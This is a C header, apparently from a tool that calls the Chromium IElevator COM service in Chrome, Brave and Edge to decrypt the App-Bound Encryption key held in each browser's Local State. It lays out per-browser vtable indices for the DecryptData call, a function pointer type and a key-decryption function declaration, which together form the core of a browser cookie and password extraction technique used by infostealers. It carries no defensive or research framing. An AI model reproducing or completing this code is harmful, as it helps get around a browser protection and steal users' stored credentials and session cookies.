#ifndef ELEVATOR_H
#define ELEVATOR_H

#include <windows.h>
#include <objbase.h>

// Browser identifiers
typedef enum _BROWSER_ID {
    BROWSER_CHROME = 0,
    BROWSER_BRAVE  = 1,
    BROWSER_EDGE   = 2,
    BROWSER_COUNT
} BROWSER_ID;

// Per-browser COM configuration
typedef struct _BROWSER_CONFIG {
    const wchar_t*  name;
    const wchar_t*  user_data_path;     // relative to %LOCALAPPDATA%
    CLSID           clsid;
    IID             iid_v1;             // IElevator
    IID             iid_v2;             // IElevator2
    int             decrypt_vtable_idx; // absolute vtable index for DecryptData
} BROWSER_CONFIG;

extern const BROWSER_CONFIG g_browsers[BROWSER_COUNT];

// IElevator vtable layout (Chrome/Brave):
//   [0] QueryInterface  [1] AddRef  [2] Release
//   [3] RunRecoveryCRXElevated  [4] EncryptData  [5] DecryptData
#define IELEVATOR_DECRYPT_IDX 5

// Edge vtable — extra base placeholder class adds 3 slots:
//   [0-2] IUnknown  [3-5] IEdgeElevatorBase_Placeholder (3 unknown)
//   [6] RunRecoveryCRXElevated  [7] EncryptData  [8] DecryptData
#define IEDGE_ELEVATOR_DECRYPT_IDX 8

// DecryptData method signature (called through vtable)
typedef HRESULT (STDMETHODCALLTYPE *PFN_DecryptData)(
    IUnknown*   pThis,
    BSTR        encrypted_data,
    BSTR*       decrypted_data,
    DWORD*      error_code
);

// Stage codes embedded in high byte for debugging
#define ELEVATOR_STAGE_COCREATE   0x00010000
#define ELEVATOR_STAGE_PROXY      0x00020000
#define ELEVATOR_STAGE_DECRYPT    0x00030000

// Initialize COM, create elevator instance, decrypt the ABE key.
// encrypted_key: raw bytes from Local State (after base64 decode + 4-byte prefix strip)
// encrypted_key_len: length of encrypted_key
// decrypted_key: receives allocated buffer with 32-byte AES key (caller frees with SysFreeString)
// decrypted_key_len: receives length
// Returns S_OK on success.
HRESULT elevator_decrypt_key(BROWSER_ID browser,
                             const BYTE* encrypted_key, DWORD encrypted_key_len,
                             BYTE** decrypted_key, DWORD* decrypted_key_len);

#endif
